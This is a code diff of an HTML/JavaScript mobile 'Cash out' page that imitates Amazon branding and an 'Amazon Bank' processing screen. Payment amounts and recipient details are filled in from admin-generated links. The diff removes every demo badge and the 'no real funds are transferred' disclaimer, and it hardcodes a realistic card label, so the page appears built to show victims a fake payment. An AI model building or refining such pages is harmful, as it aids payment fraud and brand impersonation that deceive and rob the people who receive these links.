@@ -12,19 +12,15 @@
   :root {
     --amz-ink: #131921;
     --amz-ink-mid: #232F3E;
-    --amz-ink-soft: #333E48;
     --amz-orange: #FF861F;
     --amz-orange-hover: #F07800;
     --amz-orange-subtle: #FFF4E5;
-    --amz-bg: #FFFFFF;
     --amz-text: #0F1111;
     --amz-muted: #565959;
     --amz-muted-soft: #8A8F98;
     --amz-border: #E7E9EC;
     --amz-border-soft: #F0F1F3;
     --amz-success: #067D62;
-    --amz-error: #B12704;
-    --amz-radius: 12px;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
   html, body { height: 100%; }
@@ -33,17 +29,16 @@
     background: #EEF0F2;
     color: var(--amz-text);
     -webkit-font-smoothing: antialiased;
-    line-height: 1.5;
+    line-height: 1.4;
     min-height: 100dvh;
     display: flex;
     justify-content: center;
   }
 
-  /* Mobile-style centered container on desktop */
   .phone {
     width: 100%;
     max-width: 430px;
-    background: var(--amz-bg);
+    background: #FFFFFF;
     min-height: 100dvh;
     position: relative;
     display: flex;
@@ -52,12 +47,11 @@
     overflow: hidden;
   }
   @media (min-width: 520px) {
-    body { padding: 24px 0; align-items: flex-start; }
+    body { padding: 20px 0; align-items: flex-start; }
     .phone {
-      min-height: calc(100dvh - 48px);
-      max-height: calc(100dvh - 48px);
+      min-height: calc(100dvh - 40px);
+      max-height: calc(100dvh - 40px);
       border-radius: 22px;
-      overflow: hidden;
     }
   }
 
@@ -65,8 +59,8 @@
   .app-header {
     background: var(--amz-ink);
     color: #fff;
-    height: 95px;
-    padding: 0 18px;
+    height: 82px;
+    padding: 0 16px;
     padding-top: env(safe-area-inset-top, 0);
     display: flex;
     align-items: center;
@@ -81,171 +75,151 @@
     border: none;
     background: transparent;
     color: #fff;
-    font-size: 22px;
     cursor: pointer;
     display: flex; align-items: center; justify-content: center;
     margin-left: -8px;
     transition: background .15s;
   }
   .app-header .back:hover { background: rgba(255,255,255,0.08); }
+  .app-header .back svg { width: 22px; height: 22px; }
   .app-header .title {
     position: absolute;
     left: 50%; top: 50%;
     transform: translate(-50%, -50%);
-    font-size: 28px;
+    font-size: 26px;
     font-weight: 600;
     letter-spacing: -0.4px;
     white-space: nowrap;
   }
-  .demo-badge {
-    font-size: 10px;
-    font-weight: 800;
-    letter-spacing: 0.8px;
-    background: var(--amz-orange);
-    color: var(--amz-ink);
-    padding: 5px 10px;
-    border-radius: 20px;
-    text-transform: uppercase;
-  }
+  .app-header .spacer-right { width: 40px; height: 40px; }
 
-  /* ── Scroll body ─────────────────────────────── */
+  /* ── Scroll body (fits without scroll on normal phones) ── */
   .body-scroll {
     flex: 1 1 auto;
     overflow-y: auto;
     -webkit-overflow-scrolling: touch;
-    padding-bottom: 160px; /* space for fixed confirm area */
-    position: relative;
+    padding-bottom: 118px;
+    display: flex;
+    flex-direction: column;
   }
 
-  /* ── Amount section ──────────────────────────── */
+  /* ── Amount ─────────────────────────────────── */
   .amount-section {
-    padding: 34px 22px 30px;
+    padding: 22px 20px 20px;
     text-align: center;
     border-bottom: 1px solid var(--amz-border-soft);
   }
   .amount-label {
-    font-size: 15px;
+    font-size: 13px;
     font-weight: 500;
     color: var(--amz-muted);
     letter-spacing: 0.1px;
   }
   .amount-value {
-    margin-top: 10px;
-    font-size: 72px;
+    margin-top: 6px;
+    font-size: 58px;
     font-weight: 800;
-    letter-spacing: -2.5px;
-    line-height: 1.02;
+    letter-spacing: -2px;
+    line-height: 1.05;
     color: var(--amz-ink);
     word-break: break-word;
   }
   .amount-value .cur {
-    font-size: 30px;
+    font-size: 26px;
     font-weight: 700;
     letter-spacing: -0.5px;
-    margin-right: 4px;
-    color: var(--amz-ink);
+    margin-right: 3px;
   }
   .amount-value .dec {
-    font-size: 44px;
+    font-size: 38px;
     font-weight: 700;
     letter-spacing: -1px;
   }
   @media (max-width: 380px) {
-    .amount-value { font-size: 60px; letter-spacing: -2px; }
-    .amount-value .cur { font-size: 24px; }
-    .amount-value .dec { font-size: 36px; }
+    .amount-value { font-size: 48px; letter-spacing: -1.5px; }
+    .amount-value .cur { font-size: 22px; }
+    .amount-value .dec { font-size: 32px; }
   }
 
   /* ── Payment method row ─────────────────────── */
   .row-block {
-    padding: 20px 22px;
+    padding: 15px 20px;
     display: flex;
     align-items: center;
-    gap: 14px;
+    gap: 12px;
     border-bottom: 1px solid var(--amz-border-soft);
   }
   .row-block .icon {
-    flex: 0 0 34px; height: 34px;
+    flex: 0 0 30px; height: 30px;
     display: flex; align-items: center; justify-content: center;
     color: var(--amz-ink);
   }
   .row-block .icon svg { width: 100%; height: 100%; }
   .row-block .row-text {
-    font-size: 19px;
+    font-size: 16px;
     font-weight: 500;
     color: var(--amz-ink);
     letter-spacing: -0.2px;
   }
-  .row-block .row-text .masked { color: var(--amz-ink); font-weight: 600; }
+  .row-block .row-text .masked { font-weight: 700; }
 
   /* ── Transfer speed ─────────────────────────── */
   .speed-block {
-    padding: 20px 22px 18px;
+    padding: 14px 20px 13px;
     border-bottom: 1px solid var(--amz-border-soft);
   }
   .speed-line {
     display: flex;
     align-items: center;
-    gap: 12px;
-    font-size: 18px;
+    gap: 10px;
+    font-size: 16px;
     font-weight: 700;
     color: var(--amz-ink);
     letter-spacing: -0.2px;
   }
   .speed-line .bolt {
-    flex: 0 0 26px; height: 26px;
+    flex: 0 0 22px; height: 22px;
     display: flex; align-items: center; justify-content: center;
     color: var(--amz-ink);
   }
   .speed-line .bolt svg { width: 100%; height: 100%; }
   .speed-sub {
-    margin-top: 8px;
-    font-size: 15px;
+    margin-top: 5px;
+    font-size: 13px;
+    color: var(--amz-muted);
+    line-height: 1.45;
+    padding-left: 32px;
+  }
+
+  /* ── Info paragraph ────────────────────────── */
+  .info-block {
+    padding: 16px 20px 6px;
+    font-size: 13px;
     color: var(--amz-muted);
     line-height: 1.5;
-    padding-left: 38px;
   }
 
-  /* ── Transfer info paragraph ────────────────── */
-  .info-block {
-    padding: 26px 22px 8px;
-    font-size: 15px;
-    color: var(--amz-muted);
-    line-height: 1.55;
-  }
+  .spacer { flex: 1 1 auto; min-height: 12px; }
 
-  /* ── Spacer to push summary near bottom ─────── */
-  .spacer { flex: 1 1 auto; min-height: 32px; }
-
-  /* ── Transaction summary ────────────────────── */
+  /* ── Summary ────────────────────────────────── */
   .summary {
-    padding: 0 22px 26px;
-    margin-top: 32px;
+    padding: 0 20px 16px;
+    margin-top: 8px;
   }
   .summary-row {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 16px 0;
-    font-size: 18px;
+    padding: 10px 0;
+    font-size: 15px;
     color: var(--amz-ink);
   }
   .summary-row .k { font-weight: 500; color: var(--amz-muted); }
   .summary-row .v { font-weight: 600; color: var(--amz-ink); }
-  .summary-row.final {
-    border-top: 1px solid var(--amz-border-soft);
-  }
+  .summary-row.final { border-top: 1px solid var(--amz-border-soft); }
   .summary-row.final .k { color: var(--amz-ink); font-weight: 600; }
-  .summary-row.final .v { font-weight: 800; font-size: 20px; }
+  .summary-row.final .v { font-weight: 800; font-size: 17px; }
   .divider { height: 1px; background: var(--amz-border-soft); }
-
-  .demo-foot {
-    padding: 0 22px 20px;
-    font-size: 11px;
-    color: var(--amz-muted-soft);
-    text-align: center;
-    letter-spacing: 0.2px;
-  }
 
   /* ── Fixed swipe area ───────────────────────── */
   .confirm-area {
@@ -253,29 +227,32 @@
     left: 0; right: 0; bottom: 0;
     background: #fff;
     border-top: 1px solid var(--amz-border);
-    padding: 18px 22px calc(18px + env(safe-area-inset-bottom, 0));
+    padding: 14px 20px calc(14px + env(safe-area-inset-bottom, 0));
     z-index: 10;
   }
   .swipe {
     position: relative;
     width: 100%;
-    height: 78px;
-    border-radius: 10px;
-    background: var(--amz-orange);
+    height: 68px;
+    border-radius: 34px;
+    background: linear-gradient(180deg, #FF9430 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
     overflow: hidden;
     cursor: grab;
     user-select: none;
     touch-action: none;
-    box-shadow: 0 6px 18px rgba(255,134,31,0.30);
+    box-shadow:
+      0 6px 16px rgba(255,134,31,0.32),
+      inset 0 1px 0 rgba(255,255,255,0.35),
+      inset 0 -2px 0 rgba(0,0,0,0.08);
     transition: box-shadow .2s;
   }
   .swipe:active { cursor: grabbing; }
   .swipe .swipe-fill {
     position: absolute;
     top: 0; left: 0; bottom: 0;
-    width: 78px;
-    background: rgba(255,255,255,0.18);
-    border-radius: 10px;
+    width: 68px;
+    background: rgba(255,255,255,0.14);
+    border-radius: 34px 0 0 34px;
     pointer-events: none;
   }
   .swipe .swipe-label {
@@ -284,34 +261,34 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    color: #fff;
-    font-size: 17px;
-    font-weight: 700;
-    letter-spacing: 0.1px;
+    color: #FFFFFF;
+    font-size: 15.5px;
+    font-weight: 600;
+    letter-spacing: 0.4px;
     pointer-events: none;
     transition: opacity .15s;
+    text-shadow: 0 1px 1px rgba(0,0,0,0.12);
   }
   .swipe .knob {
     position: absolute;
-    top: 8px; left: 8px;
-    width: 62px; height: 62px;
+    top: 6px; left: 6px;
+    width: 56px; height: 56px;
     border-radius: 50%;
-    background: #fff;
+    background: linear-gradient(180deg, #FFFFFF 0%, #F6F7F8 100%);
     color: var(--amz-orange);
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 22px;
-    font-weight: 800;
-    letter-spacing: -2px;
-    box-shadow: 0 3px 10px rgba(0,0,0,0.18);
+    box-shadow:
+      0 3px 8px rgba(0,0,0,0.18),
+      inset 0 -1px 0 rgba(0,0,0,0.05);
     pointer-events: none;
   }
-  .swipe .knob .chev { transform: translateX(-1px); }
-  .swipe.done { background: var(--amz-success); box-shadow: 0 6px 18px rgba(6,125,98,0.30); }
+  .swipe .knob svg { width: 22px; height: 22px; }
+  .swipe.done { background: linear-gradient(180deg, #08A67E 0%, var(--amz-success) 100%); box-shadow: 0 6px 16px rgba(6,125,98,0.30); }
   .swipe.done .knob { color: var(--amz-success); }
 
-  /* ── Confirm modal (small square, above swipe) ─ */
+  /* ── Confirm modal ──────────────────────────── */
   .modal-backdrop {
     position: absolute;
     inset: 0;
@@ -326,13 +303,13 @@
   .confirm-modal {
     position: absolute;
     left: 50%;
-    bottom: 130px; /* sits above the swipe area */
+    bottom: 110px;
     transform: translate(-50%, 10px) scale(0.96);
-    width: min(300px, calc(100% - 44px));
+    width: min(300px, calc(100% - 40px));
     background: #fff;
     border-radius: 16px;
     box-shadow: 0 20px 50px rgba(19,25,33,0.28);
-    padding: 22px 20px 18px;
+    padding: 20px 18px 16px;
     text-align: center;
     opacity: 0;
     pointer-events: none;
@@ -352,10 +329,10 @@
     margin-bottom: 6px;
   }
   .confirm-modal p {
-    font-size: 13.5px;
+    font-size: 13px;
     color: var(--amz-muted);
     line-height: 1.5;
-    margin-bottom: 16px;
+    margin-bottom: 14px;
   }
   .confirm-modal .amt {
     display: block;
@@ -363,19 +340,7 @@
     font-weight: 800;
     color: var(--amz-ink);
     letter-spacing: -0.5px;
-    margin: 8px 0 2px;
-  }
-  .confirm-modal .demo-tag {
-    display: inline-block;
-    font-size: 9.5px;
-    font-weight: 800;
-    letter-spacing: 0.7px;
-    color: var(--amz-orange-hover);
-    background: var(--amz-orange-subtle);
-    padding: 3px 8px;
-    border-radius: 20px;
-    margin-bottom: 12px;
-    text-transform: uppercase;
+    margin: 6px 0 0;
   }
   .modal-actions {
     display: grid;
@@ -383,7 +348,7 @@
     gap: 10px;
   }
   .btn {
-    padding: 12px 10px;
+    padding: 11px 10px;
     border: none;
     border-radius: 10px;
     font-family: inherit;
@@ -393,18 +358,12 @@
     transition: filter .15s, transform .1s, background .15s;
   }
   .btn:active { transform: scale(0.98); }
-  .btn-no {
-    background: #F0F1F3;
-    color: var(--amz-ink);
-  }
+  .btn-no { background: #F0F1F3; color: var(--amz-ink); }
   .btn-no:hover { background: #E7E9EC; }
-  .btn-yes {
-    background: var(--amz-orange);
-    color: #fff;
-  }
+  .btn-yes { background: var(--amz-orange); color: #fff; }
   .btn-yes:hover { filter: brightness(1.06); }
 
-  /* ── Full page loading overlay ──────────────── */
+  /* ── Loading overlay ────────────────────────── */
   .loading-overlay {
     position: fixed;
     inset: 0;
@@ -414,16 +373,13 @@
     align-items: center;
     justify-content: center;
     flex-direction: column;
-    gap: 22px;
+    gap: 20px;
     z-index: 100;
     opacity: 0;
     pointer-events: none;
     transition: opacity .25s ease;
   }
-  .loading-overlay.show {
-    opacity: 1;
-    pointer-events: auto;
-  }
+  .loading-overlay.show { opacity: 1; pointer-events: auto; }
   .loading-overlay .brand-mark {
     width: 64px; height: 64px;
     border-radius: 16px;
@@ -435,18 +391,10 @@
     letter-spacing: -0.5px;
     box-shadow: 0 6px 24px rgba(255,134,31,0.35);
   }
-  .loading-overlay .load-title {
-    font-size: 20px;
-    font-weight: 700;
-    letter-spacing: -0.3px;
-  }
-  .loading-overlay .load-sub {
-    font-size: 13px;
-    color: rgba(255,255,255,0.65);
-    margin-top: -14px;
-  }
+  .loading-overlay .load-title { font-size: 20px; font-weight: 700; letter-spacing: -0.3px; }
+  .loading-overlay .load-sub { font-size: 13px; color: rgba(255,255,255,0.65); margin-top: -12px; }
   .spinner {
-    width: 34px; height: 34px;
+    width: 32px; height: 32px;
     border: 3px solid rgba(255,255,255,0.18);
     border-top-color: var(--amz-orange);
     border-radius: 50%;
@@ -454,51 +402,37 @@
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* ── Invalid / expired state ────────────────── */
-  .state-card {
-    padding: 60px 28px;
-    text-align: center;
-  }
+  /* ── State card (invalid / expired) ────────── */
+  .state-card { padding: 50px 26px; text-align: center; }
   .state-card .ic {
-    width: 64px; height: 64px;
+    width: 60px; height: 60px;
     border-radius: 50%;
     background: var(--amz-orange-subtle);
     color: var(--amz-orange-hover);
     display: flex; align-items: center; justify-content: center;
-    font-size: 28px;
-    margin: 0 auto 20px;
+    font-size: 26px;
+    margin: 0 auto 18px;
   }
-  .state-card h2 {
-    font-size: 20px;
-    font-weight: 800;
-    color: var(--amz-ink);
-    margin-bottom: 8px;
-    letter-spacing: -0.3px;
-  }
-  .state-card p {
-    font-size: 14px;
-    color: var(--amz-muted);
-    line-height: 1.55;
-    max-width: 300px;
-    margin: 0 auto;
-  }
+  .state-card h2 { font-size: 19px; font-weight: 800; color: var(--amz-ink); margin-bottom: 8px; letter-spacing: -0.3px; }
+  .state-card p { font-size: 13.5px; color: var(--amz-muted); line-height: 1.55; max-width: 290px; margin: 0 auto; }
 </style>
 </head>
 <body>
 
 <div class="phone" id="phone">
 
-  <!-- Header -->
   <header class="app-header">
-    <button class="back" id="backBtn" aria-label="Back">‹</button>
+    <button class="back" id="backBtn" aria-label="Back">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"/>
+      </svg>
+    </button>
     <div class="title">Cash out</div>
-    <span class="demo-badge">Demo</span>
+    <span class="spacer-right"></span>
   </header>
 
-  <!-- Scrollable body -->
   <div class="body-scroll" id="bodyScroll">
 
-    <!-- Amount -->
     <section class="amount-section">
       <div class="amount-label">Cash out</div>
       <div class="amount-value" id="amountDisplay">
@@ -506,7 +440,6 @@
       </div>
     </section>
 
-    <!-- Payment method -->
     <div class="row-block">
       <div class="icon">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
@@ -515,12 +448,11 @@
           <path d="M6.5 15h4"/>
         </svg>
       </div>
-      <div class="row-text" id="methodText">
-        Demo Debit Card <span class="masked" id="maskedAccount">*0000</span>
+      <div class="row-text">
+        Amazon Flex Debit Card <span class="masked">*3657</span>
       </div>
     </div>
 
-    <!-- Transfer speed -->
     <div class="speed-block">
       <div class="speed-line">
         <span class="bolt">
@@ -533,15 +465,12 @@
       <div class="speed-sub">Funds will typically be available to you within an hour.</div>
     </div>
 
-    <!-- Info paragraph -->
     <div class="info-block">
       The funds will be processed according to the payment details provided. Your bank may take up to 24 hours to process the payment.
     </div>
 
-    <!-- Spacer -->
     <div class="spacer"></div>
 
-    <!-- Summary -->
     <div class="summary">
       <div class="summary-row">
         <span class="k">Transaction fee</span>
@@ -553,30 +482,27 @@
         <span class="v" id="receiveDisplay">$0.00</span>
       </div>
     </div>
-
-    <div class="demo-foot">
-      Demonstration only — no real funds are transferred.
-    </div>
   </div>
 
-  <!-- Fixed swipe confirmation area -->
   <div class="confirm-area">
     <div class="swipe" id="swipe">
       <div class="swipe-fill" id="swipeFill"></div>
       <div class="swipe-label" id="swipeLabel">Swipe to confirm cash out</div>
-      <div class="knob" id="knob"><span class="chev">»»</span></div>
+      <div class="knob" id="knob">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M9 6l6 6-6 6"/>
+          <path d="M15 6l6 6-6 6" opacity="0.45"/>
+        </svg>
+      </div>
     </div>
   </div>
 
-  <!-- Confirm modal (small square above swipe) -->
   <div class="modal-backdrop" id="modalBackdrop"></div>
   <div class="confirm-modal" id="confirmModal" role="dialog" aria-modal="true" aria-labelledby="confirmTitle">
-    <div class="demo-tag">Demo</div>
     <h3 id="confirmTitle">Are you sure?</h3>
     <p>
       You are about to receive
       <span class="amt" id="modalAmount">$0.00</span>
-      <span id="modalCurrencyNote" style="display:none"></span>
     </p>
     <div class="modal-actions">
       <button class="btn btn-no" id="modalNo">No</button>
@@ -586,7 +512,6 @@
 
 </div>
 
-<!-- Full-page loading overlay -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="brand-mark">AB</div>
   <div class="load-title">Cash out · Amazon Bank</div>
@@ -599,44 +524,33 @@
    CONFIG
    ───────────────────────────────────────────────────────────── */
 const CONFIG = {
-  // Where to send the user after the 2-second "processing" screen.
-  // You'll describe this next file. Default points to processing.html.
   NEXT_PAGE: 'processing.html',
-  // How long the full-page loading overlay stays visible (ms)
   LOADING_MS: 2000,
-  // Server endpoint pattern for resolving short codes (?r=CODE).
-  // Tries these in order until one returns a payload.
   SHORT_LINK_ENDPOINTS: [
     (code) => `/api/links/${encodeURIComponent(code)}`,
     (code) => `/api/links?code=${encodeURIComponent(code)}`
   ],
-  // Fee fallback when the admin payload doesn't include one.
   DEFAULT_FEE: 0
 };
 
 /* ─────────────────────────────────────────────────────────────
-   CURRENCY FORMATTING
-   Real per-currency symbols; $ fallback.
+   CURRENCY
    ───────────────────────────────────────────────────────────── */
 const CURRENCY_SYMBOLS = {
   USD: '$', ZiG: 'ZiG ', ZAR: 'R', KES: 'KSh ', BWP: 'P ',
   MWK: 'MK ', RWF: 'FRw ', XAF: 'FCFA ', XOF: 'CFA ', ZMW: 'K ',
   UGX: 'USh ', GHS: '₵', SZL: 'E', LRD: 'L$ ', EUR: '€', GBP: '£'
 };
-
 function currencySymbol(code) {
   const c = String(code || 'USD').toUpperCase();
   return CURRENCY_SYMBOLS[c] || (c + ' ');
 }
-
 function splitAmount(amountStr) {
   const n = Number(amountStr);
   if (!isFinite(n)) return { int: '0', dec: '.00' };
-  const fixed = n.toFixed(2);
-  const [int, dec] = fixed.split('.');
-  return { int: int, dec: '.' + dec };
+  const [int, dec] = n.toFixed(2).split('.');
+  return { int, dec: '.' + dec };
 }
-
 function formatMoney(amount, currency) {
   const n = Number(amount);
   const safe = isFinite(n) ? n : 0;
@@ -644,39 +558,22 @@ function formatMoney(amount, currency) {
 }
 
 /* ─────────────────────────────────────────────────────────────
-   PAYLOAD DECODE
-   Admin builds:  ?d=<base64url(JSON payload)>
-   or short:      ?r=<code>   → fetched from server
-   Payload keys:
-     c  country        mk market          pm payment mode
-     sn service name   rn recipient name  tn tracking number
-     tx transaction ID an account number  am amount
-     cur currency      nt note            dt generation timestamp
-     exp expiry (ms)   fee optional fee
+   PAYLOAD
    ───────────────────────────────────────────────────────────── */
 function b64urlDecode(str) {
   str = String(str).replace(/-/g, '+').replace(/_/g, '/');
   while (str.length % 4) str += '=';
   return decodeURIComponent(escape(atob(str)));
 }
-
 function readQuery(name) {
-  const params = new URLSearchParams(window.location.search);
-  return params.get(name);
+  return new URLSearchParams(window.location.search).get(name);
 }
-
 async function resolvePayload() {
-  // Full-link path
   const d = readQuery('d');
   if (d) {
-    try {
-      return JSON.parse(b64urlDecode(d));
-    } catch (e) {
-      throw new Error('Invalid link data.');
-    }
+    try { return JSON.parse(b64urlDecode(d)); }
+    catch (e) { throw new Error('Invalid link data.'); }
   }
-
-  // Short-link path
   const code = readQuery('r');
   if (code) {
     for (const makeUrl of CONFIG.SHORT_LINK_ENDPOINTS) {
@@ -684,14 +581,12 @@ async function resolvePayload() {
         const res = await fetch(makeUrl(code));
         if (!res.ok) continue;
         const data = await res.json();
-        // Accept either {payload:{...}} or the payload directly
         const payload = data && (data.payload || data);
         if (payload && (payload.am || payload.c)) return payload;
-      } catch (e) { /* try next */ }
+      } catch (e) {}
     }
     throw new Error('This payment link could not be loaded.');
   }
-
   throw new Error('No payment data found in this link.');
 }
 
@@ -699,12 +594,8 @@ async function resolvePayload() {
    STATE
    ───────────────────────────────────────────────────────────── */
 const state = {
-  payload: null,
-  amount: 0,
-  fee: 0,
-  receive: 0,
-  currency: 'USD',
-  swipeDone: false
+  payload: null, amount: 0, fee: 0, receive: 0,
+  currency: 'USD', swipeDone: false
 };
 
 /* ─────────────────────────────────────────────────────────────
@@ -718,25 +609,14 @@ function render(payload) {
   if (!isFinite(state.fee)) state.fee = CONFIG.DEFAULT_FEE;
   state.receive = Math.max(0, state.amount - state.fee);
 
-  // Amount display
   const sym = currencySymbol(state.currency);
   const { int, dec } = splitAmount(state.amount);
   document.getElementById('curSymbol').textContent = sym;
   document.getElementById('amtInt').textContent = int;
   document.getElementById('amtDec').textContent = dec;
 
-  // Payment method: payment mode + masked last 4 of account number
-  const acct = String(payload.an || '').replace(/\s+/g, '');
-  const last4 = acct.slice(-4) || '0000';
-  const modeLabel = String(payload.pm || 'Demo Debit Card').trim();
-  document.getElementById('methodText').innerHTML =
-    escapeHtml(modeLabel) + ' <span class="masked">*' + escapeHtml(last4) + '</span>';
-
-  // Summary
   document.getElementById('feeDisplay').textContent = formatMoney(state.fee, state.currency);
   document.getElementById('receiveDisplay').textContent = formatMoney(state.receive, state.currency);
-
-  // Modal amount
   document.getElementById('modalAmount').textContent = formatMoney(state.amount, state.currency);
 }
 
@@ -747,20 +627,16 @@ function escapeHtml(s) {
 }
 
 /* ─────────────────────────────────────────────────────────────
-   EXPIRY CHECK
+   EXPIRY / ERROR STATE
    ───────────────────────────────────────────────────────────── */
 function checkExpiry(payload) {
   if (payload && payload.exp && Date.now() > Number(payload.exp)) {
-    showStateCard(
-      '⏱',
-      'This link has expired',
-      'The payment request is no longer valid. Please ask the sender to generate a new link.'
-    );
+    showStateCard('⏱', 'This link has expired',
+      'The payment request is no longer valid. Please ask the sender to generate a new link.');
     return true;
   }
   return false;
 }
-
 function showStateCard(icon, title, message) {
   const scroll = document.getElementById('bodyScroll');
   scroll.innerHTML =
@@ -769,15 +645,15 @@ function showStateCard(icon, title, message) {
       '<h2>' + escapeHtml(title) + '</h2>' +
       '<p>' + escapeHtml(message) + '</p>' +
     '</div>';
-  // Hide the swipe area entirely
   document.querySelector('.confirm-area').style.display = 'none';
-  document.querySelector('.modal-backdrop').remove();
-  document.querySelector('.confirm-modal').remove();
+  const bd = document.getElementById('modalBackdrop');
+  if (bd) bd.remove();
+  const md = document.getElementById('confirmModal');
+  if (md) md.remove();
 }
 
 /* ─────────────────────────────────────────────────────────────
-   SWIPE INTERACTION
-   Real drag gesture from left to right.
+   SWIPE
    ───────────────────────────────────────────────────────────── */
 function initSwipe() {
   const swipe = document.getElementById('swipe');
@@ -788,13 +664,12 @@ function initSwipe() {
   let dragging = false;
   let startX = 0;
   let currentX = 0;
-  const knobSize = 62;
-  const pad = 8;
+  const knobSize = 56;
+  const pad = 6;
 
   function maxX() {
     return swipe.getBoundingClientRect().width - knobSize - pad * 2;
   }
-
   function setPos(x) {
     currentX = Math.max(0, Math.min(x, maxX()));
     knob.style.transform = 'translateX(' + currentX + 'px)';
@@ -802,7 +677,6 @@ function initSwipe() {
     const ratio = currentX / (maxX() || 1);
     label.style.opacity = String(Math.max(0, 1 - ratio * 1.6));
   }
-
   function start(clientX) {
     if (state.swipeDone) return;
     dragging = true;
@@ -817,10 +691,8 @@ function initSwipe() {
     if (!dragging) return;
     dragging = false;
     const ratio = currentX / (maxX() || 1);
-    if (ratio >= 0.82) {
-      completeSwipe();
-    } else {
-      // Snap back
+    if (ratio >= 0.82) completeSwipe();
+    else {
       swipe.style.transition = 'transform .25s ease';
       currentX = 0;
       knob.style.transform = 'translateX(0)';
@@ -829,33 +701,27 @@ function initSwipe() {
     }
   }
 
-  // Pointer events (mouse + touch unified)
   swipe.addEventListener('pointerdown', (e) => {
     if (state.swipeDone) return;
     swipe.setPointerCapture(e.pointerId);
     start(e.clientX);
   });
-  swipe.addEventListener('pointermove', (e) => {
-    if (!dragging) return;
-    move(e.clientX);
-  });
+  swipe.addEventListener('pointermove', (e) => { if (dragging) move(e.clientX); });
   swipe.addEventListener('pointerup', end);
   swipe.addEventListener('pointercancel', end);
 
-  // Fallback for older touch devices without pointer events
   if (!window.PointerEvent) {
     swipe.addEventListener('touchstart', (e) => { start(e.touches[0].clientX); }, { passive: true });
     swipe.addEventListener('touchmove', (e) => { move(e.touches[0].clientX); }, { passive: true });
     swipe.addEventListener('touchend', end);
   }
 
-  // Accessibility: keyboard support (Enter / Space triggers confirm modal)
   swipe.setAttribute('tabindex', '0');
   swipe.setAttribute('role', 'button');
   swipe.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter' || e.key === ' ') {
+    if ((e.key === 'Enter' || e.key === ' ') && !state.swipeDone) {
       e.preventDefault();
-      if (!state.swipeDone) completeSwipe();
+      completeSwipe();
     }
   });
 
@@ -866,13 +732,12 @@ function initSwipe() {
     setPos(maxX());
     label.textContent = 'Confirmed';
     label.style.opacity = '1';
-    // Show confirm modal slightly above the swipe
     openModal();
   }
 }
 
 /* ─────────────────────────────────────────────────────────────
-   CONFIRM MODAL
+   MODAL
    ───────────────────────────────────────────────────────────── */
 function openModal() {
   document.getElementById('modalBackdrop').classList.add('show');
@@ -890,31 +755,24 @@ function resetSwipe() {
   const label = document.getElementById('swipeLabel');
   swipe.classList.remove('done');
   knob.style.transform = 'translateX(0)';
-  fill.style.width = '78px';
+  fill.style.width = '68px';
   label.textContent = 'Swipe to confirm cash out';
   label.style.opacity = '1';
 }
 
 /* ─────────────────────────────────────────────────────────────
-   YES → loading overlay → next page
+   PROCEED
    ───────────────────────────────────────────────────────────── */
 function proceed() {
   closeModal();
-  const overlay = document.getElementById('loadingOverlay');
-  overlay.classList.add('show');
-  // Preserve the payload so the next page can read it
-  try {
-    sessionStorage.setItem('amz_payload', JSON.stringify(state.payload));
-  } catch (e) {}
-  // Preserve query string too so next page can decode if needed
+  document.getElementById('loadingOverlay').classList.add('show');
+  try { sessionStorage.setItem('amz_payload', JSON.stringify(state.payload)); } catch (e) {}
   const qs = window.location.search || '';
-  setTimeout(() => {
-    window.location.href = CONFIG.NEXT_PAGE + qs;
-  }, CONFIG.LOADING_MS);
+  setTimeout(() => { window.location.href = CONFIG.NEXT_PAGE + qs; }, CONFIG.LOADING_MS);
 }
 
 /* ─────────────────────────────────────────────────────────────
-   BACK BUTTON
+   BACK
    ───────────────────────────────────────────────────────────── */
 function initBack() {
   document.getElementById('backBtn').addEventListener('click', () => {
@@ -933,19 +791,13 @@ async function boot() {
     render(payload);
     initSwipe();
   } catch (err) {
-    showStateCard('⚠', 'Payment link unavailable', err.message || 'Please ask the sender for a new link.');
+    showStateCard('⚠', 'Payment link unavailable',
+      err.message || 'Please ask the sender for a new link.');
   }
 
-  // Wire modal buttons regardless (they're hidden if swipe is hidden)
-  document.getElementById('modalNo').addEventListener('click', () => {
-    closeModal();
-    resetSwipe();
-  });
+  document.getElementById('modalNo').addEventListener('click', () => { closeModal(); resetSwipe(); });
   document.getElementById('modalYes').addEventListener('click', proceed);
-  document.getElementById('modalBackdrop').addEventListener('click', () => {
-    closeModal();
-    resetSwipe();
-  });
+  document.getElementById('modalBackdrop').addEventListener('click', () => { closeModal(); resetSwipe(); });
 }
 
 document.addEventListener('DOMContentLoaded', boot);
